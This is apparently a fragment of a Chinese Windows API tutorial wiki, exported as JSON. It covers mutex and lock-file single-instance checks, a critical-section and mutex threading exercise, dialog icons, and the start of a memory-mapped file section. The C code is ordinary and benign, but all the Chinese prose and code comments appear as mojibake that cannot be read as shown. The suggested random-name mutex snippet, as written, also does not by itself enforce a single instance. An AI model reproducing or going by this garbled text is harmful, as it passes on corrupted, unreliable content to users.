printf(&quot;å·²ç»æœ‰ä¸€ä¸ªæ­£åœ¨è¿è¡Œäº†ã€‚ &quot;); CloseHandle(hMutex); getchar(); return 1; &#125; printf(&quot;ç¨‹åºæ­£åœ¨è¿è¡Œï¼ŒæŒ‰ä»»æ„é”®é€€å‡º... &quot;); getchar(); // ä¿æŒç­‰å¾… ReleaseMutex(hMutex); // é‡Šæ”¾äº’æ–¥å¯¹è±¡ CloseHandle(hMutex); // å…³é—­å¥æŸ„ return 0;&#125; ä½†è¿™æ ·æœ‰ä¸€ä¸ªæ½œåœ¨çš„é£é™©ï¼šæ¶æ„ç”¨æˆ·å¯èƒ½åœ¨ä½ çš„åº”ç”¨ç¨‹åºå°è¯•åˆ›å»ºè¯¥äº’æ–¥å¯¹è±¡ä¹‹å‰å…ˆåˆ›å»ºåŒåçš„äº’æ–¥å¯¹è±¡ï¼Œä»è€Œé˜»æ­¢ä½ çš„åº”ç”¨ç¨‹åºå¯åŠ¨ã€‚æœ‰ä¸¤ç§å¸¸è§è§£å†³åŠæ³•ï¼š åˆ›å»ºä¸€ä¸ªéšæœºå‘½åçš„äº’æ–¥å¯¹è±¡ï¼Œå¹¶å°†åç§°å­˜å‚¨åœ¨åªæœ‰æˆæƒç”¨æˆ·èƒ½è®¿é—®çš„åœ°æ–¹ã€‚è¿™æ ·ï¼Œæ¶æ„ç”¨æˆ·å°±å¾ˆéš¾çŒœæµ‹æˆ–æå‰åˆ›å»ºåŒåçš„äº’æ–¥å¯¹è±¡ã€‚ 123456789101112131415161718#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;time.h&gt;int main() &#123; char mutexName[256]; HANDLE hMutex; // ç”Ÿæˆä¸€ä¸ªéšæœºåç§°çš„äº’æ–¥å¯¹è±¡ srand((unsigned)time(NULL)); snprintf(mutexName, sizeof(mutexName), &quot;MyAppMutex_%d&quot;, rand()); // å°è¯•åˆ›å»ºäº’æ–¥å¯¹è±¡ hMutex = CreateMutex(NULL, FALSE, mutexName); // ...å…¶ä½™ä»£ç ä¸å‰é¢çš„ä¾‹å­ç›¸åŒ...&#125; ä½¿ç”¨æ–‡ä»¶æ¥å®ç°å•å®ä¾‹é™åˆ¶ã€‚è¿™ç§æ–¹æ³•æ˜¯åœ¨ç”¨æˆ·çš„ä¸ªäººèµ„æ–™ç›®å½•ä¸­åˆ›å»ºä¸€ä¸ªè¢«é”å®šçš„æ–‡ä»¶ï¼Œç”¨æ–‡ä»¶çš„å­˜åœ¨ä¸å¦æ¥åˆ¤æ–­ç¨‹åºæ˜¯å¦å·²è¿è¡Œã€‚ 123456789101112131415161718192021222324252627#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main() &#123; const char* filePath = &quot;C:\\\\Users\\\\&lt;username&gt;\\\\MyApp.lock&quot;; HANDLE hFile; // å°è¯•åˆ›å»ºé”å®šæ–‡ä»¶ hFile = CreateFile(filePath, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL); if (hFile == INVALID_HANDLE_VALUE) &#123; if (GetLastError() == ERROR_FILE_EXISTS) &#123; printf(&quot;åº”ç”¨ç¨‹åºå·²åœ¨è¿è¡Œã€‚ &quot;); return 1; &#125; printf(&quot;æ— æ³•åˆ›å»ºé”å®šæ–‡ä»¶ã€‚ &quot;); return 1; &#125; printf(&quot;åº”ç”¨ç¨‹åºæ­£åœ¨è¿è¡Œï¼ŒæŒ‰ä»»æ„é”®é€€å‡º... &quot;); getchar(); CloseHandle(hFile); DeleteFile(filePath); // åˆ é™¤é”å®šæ–‡ä»¶ return 0;&#125; è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬å°è¯•åœ¨ç”¨æˆ·çš„ä¸ªäººèµ„æ–™ç›®å½•ä¸­åˆ›å»ºä¸€ä¸ªç‰¹å®šçš„æ–‡ä»¶ã€‚å¦‚æœæ–‡ä»¶åˆ›å»ºæˆåŠŸï¼Œè¡¨æ˜ç¨‹åºå®ä¾‹å°šæœªè¿è¡Œã€‚å¦‚æœæ–‡ä»¶å·²å­˜åœ¨ï¼Œè¡¨ç¤ºç¨‹åºå·²ç»åœ¨è¿è¡Œã€‚ æ³¨æ„ï¼šåœ¨å®é™…åº”ç”¨ä¸­ï¼Œä½ éœ€è¦å°† &lt;username&gt; æ›¿æ¢ä¸ºå®é™…çš„ç”¨æˆ·åï¼Œæˆ–è€…ä½¿ç”¨å‡½æ•°åŠ¨æ€è·å–ç”¨æˆ·çš„ç›®å½•è·¯å¾„ã€‚ Linuxä¸­å¸¸è§çš„é˜²åº”ç”¨ç¨‹åºå¤šå¼€çš„æ–¹æ³•å°±æ˜¯ä½¿ç”¨é”æ–‡ä»¶ï¼ˆlock fileï¼‰ã€‚è¿™ç§æ–¹æ³•çš„æ ¸å¿ƒæ€æƒ³æ˜¯åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­åˆ›å»ºä¸€ä¸ªç‰¹å®šçš„æ–‡ä»¶ï¼Œä½œä¸ºç¨‹åºæ­£åœ¨è¿è¡Œçš„æ ‡å¿—ã€‚å½“ç¨‹åºå¯åŠ¨æ—¶ï¼Œå®ƒä¼šæ£€æŸ¥è¿™ä¸ªæ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºè¯¥æ–‡ä»¶å¹¶ç»§ç»­æ‰§è¡Œï¼›å¦‚æœæ–‡ä»¶å·²ç»å­˜åœ¨ï¼Œåˆ™è¡¨æ˜å¦ä¸€ä¸ªå®ä¾‹å·²åœ¨è¿è¡Œï¼Œç¨‹åºé€šå¸¸ä¼šé€€å‡ºã€‚è¿™ç§æ–¹æ³•çš„ä¸€ä¸ªé‡è¦æ³¨æ„äº‹é¡¹æ˜¯åœ¨ç¨‹åºé€€å‡ºæ—¶ï¼ˆæ— è®ºæ˜¯æ­£å¸¸é€€å‡ºè¿˜æ˜¯å› ä¸ºé”™è¯¯ã€å¼‚å¸¸é€€å‡ºï¼‰ç¡®ä¿åˆ é™¤è¯¥é”å®šæ–‡ä»¶ã€‚å¦åˆ™ï¼Œå¯èƒ½ä¼šå¯¼è‡´ç¨‹åºå³ä½¿æ²¡æœ‰è¿è¡Œï¼Œä¹Ÿä¸èƒ½å†æ¬¡å¯åŠ¨çš„æƒ…å†µã€‚ 12345678910111213141516171819202122232425262728293031323334#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/file.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;int main() &#123; const char* lockFile = &quot;/tmp/myapp.lock&quot;; int fd = open(lockFile, O_CREAT | O_RDWR, 0666); if (fd == -1) &#123; perror(&quot;æ— æ³•æ‰“å¼€é”å®šæ–‡ä»¶&quot;); return 1; &#125; // å°è¯•å¯¹æ–‡ä»¶åŠ é” if (flock(fd, LOCK_EX | LOCK_NB) == -1) &#123; perror(&quot;æ— æ³•è·å–æ–‡ä»¶é”ï¼Œåº”ç”¨ç¨‹åºå¯èƒ½å·²åœ¨è¿è¡Œ&quot;); close(fd); return 1; &#125; printf(&quot;åº”ç”¨ç¨‹åºæ­£åœ¨è¿è¡Œï¼ŒæŒ‰Ctrl+Cé€€å‡º... &quot;); while (1) &#123; // åº”ç”¨ç¨‹åºçš„ä¸»å¾ªç¯ sleep(1); // è¿™é‡Œåªæ˜¯ä¸€ä¸ªç¤ºä¾‹ï¼Œå®é™…åº”ç”¨ä¸­åº”æ›¿æ¢ä¸ºå®é™…çš„é€»è¾‘ &#125; // æ¸…ç† flock(fd, LOCK_UN); close(fd); remove(lockFile); return 0;&#125; å…¶ä»–ï¼ˆæœªæ¥éœ€è¦å†æŸ¥MSDNï¼‰ unnamedçš„mutex object lpNameå­—æ®µå¯ä»¥æŒ‡å®šmutex objectæ˜¯æœ¬åœ°æˆ–å…¨å±€çš„ å¤šçº¿ç¨‹æŠ¢çº¢åŒ…ç»ƒä¹  çº¢åŒ…æ± ä¸­æœ‰åˆå§‹é‡‘é¢1000ï¼Œç‚¹å‡»å¼€å§‹æŠ¢çº¢åŒ…åï¼Œ3ä¸ªçº¿ç¨‹å¼€å§‹æŠ¢çº¢åŒ…æ± ä¸­çš„çº¢åŒ…ï¼Œæ¯æ¬¡æŠ¢50ã€‚çº¢åŒ…æ± ä¸­é‡‘é¢ä¸º0æ—¶æŠ¢çº¢åŒ…ç»“æŸã€‚æ£€éªŒäº’æ–¥æ§åˆ¶æ˜¯å¦åšå¥½çš„æ ‡å‡†ï¼šæŠ¢çº¢åŒ…ç»“æŸåï¼Œçº¿ç¨‹123ä¸‰ä¸ªæ¡†æ€»æ•°åŠ èµ·æ¥ä¸º1000ã€‚åˆ†åˆ«ä½¿ç”¨ä¸´ç•ŒåŒºé”å’Œäº’æ–¥ä½“é”ä¸¤ç§æ–¹æ³•åˆ†åˆ«è¿›è¡Œäº’æ–¥æ§åˆ¶ã€‚ tipsï¼š åœ¨WM_COMMANDä¸­æ–°èµ·ä¸€ä¸ªå·¥ä½œçº¿ç¨‹ï¼Œåœ¨è¿™ä¸ªå·¥ä½œçº¿ç¨‹ä¸­èµ·3ä¸ªçº¿ç¨‹æ¥æŠ¢çº¢åŒ…ï¼Œé˜²æ­¢UIå¡é¡¿ æŠ¢çº¢åŒ…çº¿ç¨‹æœ«å°¾è¿›è¡ŒSleepï¼Œé˜²æ­¢ä¸€ä¸ªçº¿ç¨‹è¿è¡Œæ—¶å°±å°†çº¢åŒ…æŠ¢å®Œ è®°å¾—é‡Šæ”¾èµ„æºï¼ŒCloseHandleï¼Œåˆ é™¤ä¸´ç•ŒåŒº/é‡Šæ”¾äº’æ–¥é” è¿‡ç¨‹ä¸´ç•ŒåŒºé”äº’æ–¥ä½“123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125#include &quot;resource.h&quot;#include &lt;Windows.h&gt;#include &lt;stdio.h&gt; //sprintfBOOL CALLBACK DialogProc(HWND hwndDlg, UINT uMsg, WPARAM wParam, LPARAM lParam);DWORD WINAPI WorkerThreadProc(LPVOID lpParameter);DWORD WINAPI ThreadFunc(LPVOID lpParameter);CRITICAL_SECTION g_cs;HWND g_hEdit_RedPacket = NULL;HWND g_hEdit_Thread1 = NULL;HWND g_hEdit_Thread2 = NULL;HWND g_hEdit_Thread3 = NULL;int APIENTRY WinMain(HINSTANCE hInstance, // å½“å‰ç¨‹åºå®ä¾‹çš„å¥æŸ„ HINSTANCE hPrevInstance, // å‰ä¸€ä¸ªå®ä¾‹çš„å¥æŸ„ï¼Œä¸å†ä½¿ç”¨ LPSTR lpCmdLine, // å‘½ä»¤è¡Œå‚æ•° int nCmdShow // æ§åˆ¶çª—å£æ˜¾ç¤ºæ–¹å¼çš„æ ‡å¿—)&#123; DialogBox(hInstance, //å½“å‰ç¨‹åºçš„å®ä¾‹å¥æŸ„ MAKEINTRESOURCE(IDD_DIALOG_MAIN), //å¯¹è¯æ¡†æ¨¡æ¿çš„åç§°æˆ–èµ„æºæ ‡è¯†ç¬¦ NULL, //çˆ¶çª—å£å¥æŸ„ï¼Œè¿™é‡Œæ— ï¼Œä¸ºNULL DialogProc //å¯¹è¯æ¡†æ¶ˆæ¯å¤„ç†å‡½æ•° ); return 0;&#125;BOOL CALLBACK DialogProc(HWND hwndDlg, // handle to dialog box UINT uMsg, // message WPARAM wParam, // first message parameter LPARAM lParam // second message parameter )&#123; switch (uMsg) &#123; case WM_INITDIALOG: g_hEdit_RedPacket = GetDlgItem(hwndDlg, IDC_EDIT_REDPACKETPOOL); g_hEdit_Thread1 = GetDlgItem(hwndDlg, IDC_EDIT_THREAD1); g_hEdit_Thread2 = GetDlgItem(hwndDlg, IDC_EDIT_THREAD2); g_hEdit_Thread3 = GetDlgItem(hwndDlg, IDC_EDIT_THREAD3); SetWindowText(g_hEdit_RedPacket, TEXT(&quot;1000&quot;)); //çº¢åŒ…æ± åˆå§‹é‡‘é¢ä¸º1000 SetWindowText(g_hEdit_Thread1, TEXT(&quot;0&quot;)); //çº¿ç¨‹åˆå§‹é‡‘é¢ä¸º0 SetWindowText(g_hEdit_Thread2, TEXT(&quot;0&quot;)); SetWindowText(g_hEdit_Thread3, TEXT(&quot;0&quot;)); return TRUE; case WM_CLOSE: EndDialog(hwndDlg, 0); return TRUE; case WM_COMMAND: switch (LOWORD(wParam)) &#123; case IDC_BUTTON_START: HANDLE hWorkerThread; hWorkerThread = CreateThread(NULL, 0, WorkerThreadProc, NULL, 0, NULL);// åˆ›å»ºä¸€ä¸ªæ–°çº¿ç¨‹ä½œä¸ºå·¥ä½œçº¿ç¨‹ï¼Œé˜²æ­¢UIå¡é¡¿ CloseHandle(hWorkerThread); return TRUE; &#125; &#125; return FALSE;&#125;//å·¥ä½œçº¿ç¨‹DWORD WINAPI WorkerThreadProc(LPVOID lpParameter)&#123; InitializeCriticalSection(&amp;g_cs); HANDLE hThreads[3] = &#123;NULL&#125;; hThreads[0] = CreateThread(NULL, 0, ThreadFunc, g_hEdit_Thread1, 0, NULL); //çº¿ç¨‹2 hThreads[1] = CreateThread(NULL, 0, ThreadFunc, g_hEdit_Thread2, 0, NULL); //çº¿ç¨‹2 hThreads[2] = CreateThread(NULL, 0, ThreadFunc, g_hEdit_Thread3, 0, NULL); //çº¿ç¨‹3 WaitForMultipleObjects(3, hThreads, TRUE, INFINITE); for (int i = 0; i &lt; 3; i++) &#123; CloseHandle(hThreads[i]); &#125; DeleteCriticalSection(&amp;g_cs); return 0;&#125;//æŠ¢çº¢åŒ…çº¿ç¨‹DWORD WINAPI ThreadFunc(LPVOID lpParameter)&#123; HWND hEditThread = (HWND)lpParameter; TCHAR szBuffer[10] = &#123; 0 &#125;; DWORD dwThreadSum = 0; while (TRUE) &#123; EnterCriticalSection(&amp;g_cs); // è¿›å…¥ä¸´ç•ŒåŒº //å–çº¢åŒ…æ± ä¸­å½“å‰çš„é‡‘é¢ &lt;=0å°±breakï¼Œ&gt;=0å°±æŠ¢çº¢åŒ… GetWindowText(g_hEdit_RedPacket, szBuffer, 10); // ä»çº¢åŒ…æ± ç¼–è¾‘æ¡†è¯»å€¼ DWORD dwRedPacketPool = atoi(szBuffer); // å­—ç¬¦è½¬æ•°å­— if (dwRedPacketPool &lt;= 0) &#123; LeaveCriticalSection(&amp;g_cs); break; &#125; //çº¢åŒ…æ± é‡Œè¿˜æœ‰çº¢åŒ… dwRedPacketPool -= 50; // -50 sprintf(szBuffer, &quot;%d&quot;, dwRedPacketPool); // æ•°å­—è½¬å­—ç¬¦ SetWindowText(g_hEdit_RedPacket, szBuffer); // æ›´æ–°çº¢åŒ…æ± ä¸­ //çº¿ç¨‹å¼€å§‹æŠ¢çº¢åŒ…ï¼Œæ¯æ¬¡æŠ¢50 GetWindowText(hEditThread, szBuffer, 10); // ä»ç¼–è¾‘æ¡†è¯»å€¼ dwThreadSum = atoi(szBuffer); // å­—ç¬¦è½¬æ•°å­— dwThreadSum += 50; // +50åæ”¾å› sprintf(szBuffer, &quot;%d&quot;, dwThreadSum); // æ•°å­—è½¬å­—ç¬¦ SetWindowText(hEditThread, szBuffer); // è®¾ç½®çº¿ç¨‹åé¢ç¼–è¾‘æ¡†çš„å€¼ LeaveCriticalSection(&amp;g_cs); Sleep(500); //é˜²æ­¢ä¸€ä¸ªçº¿ç¨‹ç›´æ¥å°†çº¢åŒ…æ± é‡Œçš„çº¢åŒ…æŠ¢å…‰ &#125; return 0;&#125;äº’æ–¥é”123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126//äº’æ–¥é”#include &quot;resource.h&quot;#include &lt;Windows.h&gt;#include &lt;stdio.h&gt; //sprintfBOOL CALLBACK DialogProc(HWND hwndDlg, UINT uMsg, WPARAM wParam, LPARAM lParam);DWORD WINAPI WorkerThreadProc(LPVOID lpParameter);DWORD WINAPI ThreadFunc(LPVOID lpParameter);HANDLE g_hMutex = NULL;HWND g_hEdit_RedPacket = NULL;HWND g_hEdit_Thread1 = NULL;HWND g_hEdit_Thread2 = NULL;HWND g_hEdit_Thread3 = NULL;int APIENTRY WinMain(HINSTANCE hInstance, // å½“å‰ç¨‹åºå®ä¾‹çš„å¥æŸ„ HINSTANCE hPrevInstance, // å‰ä¸€ä¸ªå®ä¾‹çš„å¥æŸ„ï¼Œä¸å†ä½¿ç”¨ LPSTR lpCmdLine, // å‘½ä»¤è¡Œå‚æ•° int nCmdShow // æ§åˆ¶çª—å£æ˜¾ç¤ºæ–¹å¼çš„æ ‡å¿—)&#123; DialogBox(hInstance, //å½“å‰ç¨‹åºçš„å®ä¾‹å¥æŸ„ MAKEINTRESOURCE(IDD_DIALOG_MAIN), //å¯¹è¯æ¡†æ¨¡æ¿çš„åç§°æˆ–èµ„æºæ ‡è¯†ç¬¦ NULL, //çˆ¶çª—å£å¥æŸ„ï¼Œè¿™é‡Œæ— ï¼Œä¸ºNULL DialogProc //å¯¹è¯æ¡†æ¶ˆæ¯å¤„ç†å‡½æ•° ); return 0;&#125;BOOL CALLBACK DialogProc(HWND hwndDlg, // handle to dialog box UINT uMsg, // message WPARAM wParam, // first message parameter LPARAM lParam // second message parameter )&#123; switch (uMsg) &#123; case WM_INITDIALOG: g_hEdit_RedPacket = GetDlgItem(hwndDlg, IDC_EDIT_REDPACKETPOOL); g_hEdit_Thread1 = GetDlgItem(hwndDlg, IDC_EDIT_THREAD1); g_hEdit_Thread2 = GetDlgItem(hwndDlg, IDC_EDIT_THREAD2); g_hEdit_Thread3 = GetDlgItem(hwndDlg, IDC_EDIT_THREAD3); SetWindowText(g_hEdit_RedPacket, TEXT(&quot;1000&quot;)); //çº¢åŒ…æ± åˆå§‹é‡‘é¢ä¸º1000 SetWindowText(g_hEdit_Thread1, TEXT(&quot;0&quot;)); //çº¿ç¨‹åˆå§‹é‡‘é¢ä¸º0 SetWindowText(g_hEdit_Thread2, TEXT(&quot;0&quot;)); SetWindowText(g_hEdit_Thread3, TEXT(&quot;0&quot;)); return TRUE; case WM_CLOSE: EndDialog(hwndDlg, 0); return TRUE; case WM_COMMAND: switch (LOWORD(wParam)) &#123; case IDC_BUTTON_START: HANDLE hWorkerThread; hWorkerThread = CreateThread(NULL, 0, WorkerThreadProc, NULL, 0, NULL);// åˆ›å»ºä¸€ä¸ªæ–°çº¿ç¨‹ä½œä¸ºå·¥ä½œçº¿ç¨‹ï¼Œé˜²æ­¢UIå¡é¡¿ CloseHandle(hWorkerThread); return TRUE; &#125; &#125; return FALSE;&#125;//å·¥ä½œçº¿ç¨‹DWORD WINAPI WorkerThreadProc(LPVOID lpParameter)&#123; g_hMutex = CreateMutex(NULL, FALSE, NULL); HANDLE hThreads[3] = &#123; NULL &#125;; hThreads[0] = CreateThread(NULL, 0, ThreadFunc, g_hEdit_Thread1, 0, NULL); //çº¿ç¨‹2 hThreads[1] = CreateThread(NULL, 0, ThreadFunc, g_hEdit_Thread2, 0, NULL); //çº¿ç¨‹2 hThreads[2] = CreateThread(NULL, 0, ThreadFunc, g_hEdit_Thread3, 0, NULL); //çº¿ç¨‹3 WaitForMultipleObjects(3, hThreads, TRUE, INFINITE); for (int i = 0; i &lt; 3; i++) &#123; CloseHandle(hThreads[i]); &#125; CloseHandle(g_hMutex); return 0;&#125;//æŠ¢çº¢åŒ…çº¿ç¨‹DWORD WINAPI ThreadFunc(LPVOID lpParameter)&#123; HWND hEditThread = (HWND)lpParameter; TCHAR szBuffer[10] = &#123; 0 &#125;; DWORD dwThreadSum = 0; while (TRUE) &#123; WaitForSingleObject(g_hMutex, INFINITE); //ç­‰å¾…è·å–äº’æ–¥é” //å–çº¢åŒ…æ± ä¸­å½“å‰çš„é‡‘é¢ &lt;=0å°±breakï¼Œ&gt;=0å°±æŠ¢çº¢åŒ… GetWindowText(g_hEdit_RedPacket, szBuffer, 10); // ä»çº¢åŒ…æ± ç¼–è¾‘æ¡†è¯»å€¼ DWORD dwRedPacketPool = atoi(szBuffer); // å­—ç¬¦è½¬æ•°å­— if (dwRedPacketPool &lt;= 0) &#123; ReleaseMutex(g_hMutex); //é‡Šæ”¾äº’æ–¥é” break; &#125; //çº¢åŒ…æ± é‡Œè¿˜æœ‰çº¢åŒ… dwRedPacketPool -= 50; // -50 sprintf(szBuffer, &quot;%d&quot;, dwRedPacketPool); // æ•°å­—è½¬å­—ç¬¦ SetWindowText(g_hEdit_RedPacket, szBuffer); // æ›´æ–°çº¢åŒ…æ± ä¸­ //çº¿ç¨‹å¼€å§‹æŠ¢çº¢åŒ…ï¼Œæ¯æ¬¡æŠ¢50 GetWindowText(hEditThread, szBuffer, 10); // ä»ç¼–è¾‘æ¡†è¯»å€¼ dwThreadSum = atoi(szBuffer); // å­—ç¬¦è½¬æ•°å­— dwThreadSum += 50; // +50åæ”¾å› sprintf(szBuffer, &quot;%d&quot;, dwThreadSum); // æ•°å­—è½¬å­—ç¬¦ SetWindowText(hEditThread, szBuffer); // è®¾ç½®çº¿ç¨‹åé¢ç¼–è¾‘æ¡†çš„å€¼ ReleaseMutex(g_hMutex); //é‡Šæ”¾äº’æ–¥é” Sleep(500); //é˜²æ­¢ä¸€ä¸ªçº¿ç¨‹ç›´æ¥å°†çº¢åŒ…æ± é‡Œçš„çº¢åŒ…æŠ¢å…‰ &#125; return 0;&#125;"},{"title":"ä½¿ç”¨å›¾æ ‡","path":"/wiki/Windows_API/ä½¿ç”¨å›¾æ ‡.html","content":"ç»§ç»­ç”¨ä¸Šä¸€èŠ‚çš„å¯¹è¯æ¡†ä»£ç ä½œä¸ºç¤ºä¾‹ï¼Œé¡¹ç›®ï¼Œå³é”®â€œæ·»åŠ â€-â€œèµ„æºâ€ï¼Œé€‰æ‹©Iconã€‚ â€œæ–°å»ºâ€æ˜¯è‡ªå·±ç”»ï¼Œé€‰æ‹©â€œå¯¼å…¥â€ï¼Œä¼ ä¸¤å¼ icoå›¾ä¸Šæ¥ã€‚åœ¨èµ„æºè§†å›¾ï¼Œé€‰æ‹©ç›®æ ‡Icoå›¾æ ‡ï¼Œå³é”®ï¼Œå±æ€§ï¼Œåœ¨å¼¹å‡ºçš„IDé‚£æ”¹ä¸‹IDã€‚ ç”¨LoadIconè·å–å›¾æ ‡å¥æŸ„ï¼Œåœ¨å¯¹è¯æ¡†åˆå§‹åŒ–WM_INITDIALOGé‚£ç”¨SendMessageå‘æ¶ˆæ¯ç»™å¯¹è¯æ¡†è®¾ç½®å›¾æ ‡ã€‚ 123456789case WM_INITDIALOG: //å¯¹è¯æ¡†åˆ›å»ºçš„äº‹ä»¶ï¼Œåƒä¹‹å‰å†™çª—å£ç¨‹åºæ—¶çš„WM_CREATE hBigIcon = LoadIcon(g_hInstance, MAKEINTRESOURCE(IDI_ICON_BIG)); hSmallIcon = LoadIcon(g_hInstance, MAKEINTRESOURCE(IDI_ICON_SMALL)); //è®¾ç½®å›¾æ ‡ SendMessage(hwndDlg, WM_SETICON, ICON_BIG, (LPARAM)hBigIcon); SendMessage(hwndDlg, WM_SETICON, ICON_SMALL, (LPARAM)hSmallIcon); return TRUE; ICON_BIGå’ŒICON_SMALLæ˜¯é¢„å®šä¹‰çš„æ ‡è¯†ç¬¦ ICON_BIGï¼šè®¾ç½®å¤§å›¾æ ‡ ICON_SMALLï¼šè®¾ç½®å°å›¾æ ‡ åœ¨è¿™é‡Œä¾‹å­ä¸­fg.iconæ˜¯ç”¨äºè®¾ç½®ä¸ºå¤§å›¾æ ‡ï¼ŒLord PEé‚£ä¸ªiconè®¾ç½®ä¸ºå°å›¾æ ‡ å®Œæ•´ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778#include &lt;Windows.h&gt;#include &quot;resource.h&quot;BOOL CALLBACK DialogProc(HWND hwndDlg, UINT uMsg, WPARAM wParam, LPARAM lParam);HINSTANCE g_hInstance = NULL;int APIENTRY WinMain(HINSTANCE hInstance, // å½“å‰ç¨‹åºå®ä¾‹çš„å¥æŸ„ HINSTANCE hPrevInstance, // å‰ä¸€ä¸ªå®ä¾‹çš„å¥æŸ„ï¼Œä¸å†ä½¿ç”¨ LPSTR lpCmdLine, // å‘½ä»¤è¡Œå‚æ•° int nCmdShow // æ§åˆ¶çª—å£æ˜¾ç¤ºæ–¹å¼çš„æ ‡å¿—)&#123; g_hInstance = hInstance; DialogBox(hInstance, //å½“å‰ç¨‹åºçš„å®ä¾‹å¥æŸ„ MAKEINTRESOURCE(IDD_DIALOG1), //å¯¹è¯æ¡†æ¨¡æ¿çš„åç§°æˆ–èµ„æºæ ‡è¯†ç¬¦ NULL, //çˆ¶çª—å£å¥æŸ„ï¼Œè¿™é‡Œæ— ï¼Œä¸ºNULL DialogProc //å¯¹è¯æ¡†æ¶ˆæ¯å¤„ç†å‡½æ•° ); return 0;&#125;BOOL CALLBACK DialogProc(HWND hwndDlg, // handle to dialog box UINT uMsg, // message WPARAM wParam, // first message parameter LPARAM lParam // second message parameter )&#123; HICON hBigIcon = NULL; HICON hSmallIcon = NULL; switch (uMsg) &#123; case WM_INITDIALOG: //å¯¹è¯æ¡†åˆ›å»ºçš„æ¶ˆæ¯ï¼Œåƒä¹‹å‰å†™çª—å£ç¨‹åºæ—¶çš„WM_CREATE hBigIcon = LoadIcon( g_hInstance, // åº”ç”¨ç¨‹åºå®ä¾‹å¥æŸ„ MAKEINTRESOURCE(IDI_ICON_BIG) // èµ„æºæ ‡è¯†ç¬¦ ); hSmallIcon = LoadIcon( g_hInstance, // åº”ç”¨ç¨‹åºå®ä¾‹å¥æŸ„ MAKEINTRESOURCE(IDI_ICON_SMALL) // èµ„æºæ ‡è¯†ç¬¦ ); // è®¾ç½®å¤§å›¾æ ‡ SendMessage( hwndDlg, // å¯¹è¯æ¡†çª—å£å¥æŸ„ WM_SETICON, // æ¶ˆæ¯æ ‡è¯†ç¬¦ï¼ŒæŒ‡ç¤ºè®¾ç½®å›¾æ ‡ ICON_BIG, // å›¾æ ‡ç±»å‹æ ‡è¯†ç¬¦ã€‚ICON_BIGæ˜¯é¢„å®šä¹‰çš„æ ‡è¯†ç¬¦ï¼Œè¡¨ç¤ºè®¾ç½®å¤§å›¾æ ‡ (LPARAM)hBigIcon // å›¾æ ‡å¥æŸ„ ); // è®¾ç½®å°å›¾æ ‡ SendMessage( hwndDlg, // å¯¹è¯æ¡†çª—å£å¥æŸ„ WM_SETICON, // æ¶ˆæ¯æ ‡è¯†ç¬¦ï¼ŒæŒ‡ç¤ºè®¾ç½®å›¾æ ‡ ICON_SMALL, // å›¾æ ‡ç±»å‹æ ‡è¯†ç¬¦ã€‚ICON_SMALLæ˜¯é¢„å®šä¹‰çš„æ ‡è¯†ç¬¦ï¼Œè¡¨ç¤ºè®¾ç½®å°å›¾æ ‡ (LPARAM)hSmallIcon // å›¾æ ‡å¥æŸ„ ); return TRUE; case WM_COMMAND: switch (LOWORD(wParam)) &#123; case ID_BUTTON_OK: return TRUE; case ID_BUTTON_EXIT: EndDialog(hwndDlg, 0); //å…³é—­å¯¹è¯æ¡† return TRUE; &#125; break; &#125; return FALSE;&#125; è¿è¡Œç»“æœ å°å›¾æ ‡å¤§å›¾æ ‡å¯¹è¯æ¡†å·¦ä¸Šè§’ï¼Œç­‰å…¶ä½™åœ°æ–¹ï¼Œæ˜¾ç¤ºçš„æ˜¯å°å›¾æ ‡ ä»»åŠ¡æ ä¸‹æ–¹ï¼ŒAlt+Tabï¼Œç­‰ä½ç½®æ˜¾ç¤ºçš„æ˜¯å¤§å›¾æ ‡ ä¸€èˆ¬æ¥è¯´å¤§å›¾æ ‡å’Œå°å›¾æ ‡ç”¨åŒä¸€ä¸ªå›¾æ ‡ï¼Œè¿™é‡Œæ˜¯ä¸ºäº†æ¼”ç¤ºä»€ä¹ˆæ˜¯å¤§å›¾æ ‡ï¼Œä»€ä¹ˆæ˜¯å°å›¾æ ‡ï¼Œæ‰€ä»¥ç”¨äº†ä¸¤å¼ å›¾ã€‚"},{"title":"å†…å­˜æ˜ å°„æ–‡ä»¶","path":"/wiki/Windows_API/å†…å­˜æ˜ å°„æ–‡ä»¶.html","content":"å†…å­˜æ˜ å°„æ–‡ä»¶ è°ƒç”¨CreateFileMappingæ—¶å¦‚æœç¬¬ä¸€ä¸ªå‚æ•°ä¼ äº†hFileï¼Œé‚£ä¹ˆå‡†å¤‡ç‰©ç†é¡µåï¼Œä¼šå°†æ–‡ä»¶å†…å®¹æ˜ å°„åˆ°ç‰©ç†é¡µä¸Šã€‚éšåï¼Œè¿›ç¨‹è°ƒç”¨MapViewOfFileå°†è‡ªèº«çš„è™šæ‹Ÿåœ°å€ç©ºé—´ä¸è¯¥ç‰©ç†é¡µè¿›è¡Œå…³è”ã€‚é‚£ä¹ˆï¼Œè®¿é—®è‡ªèº«çš„å†…å­˜å°±ç›¸å½“äºæ˜¯åœ¨è®¿é—®æ–‡ä»¶å†…å®¹ã€‚ çœ‹å…¶åï¼ŒçŸ¥å…¶æ„ï¼š å¦‚æœCreateFileMappingå‡½æ•°ä¼ äº†hFileï¼Œå¯ä»¥ç†è§£ä¸ºè¿™ä¸ªæ–‡ä»¶åˆ›å»ºæ–‡ä»¶æ˜ å°„(FileMapping)ã€‚ 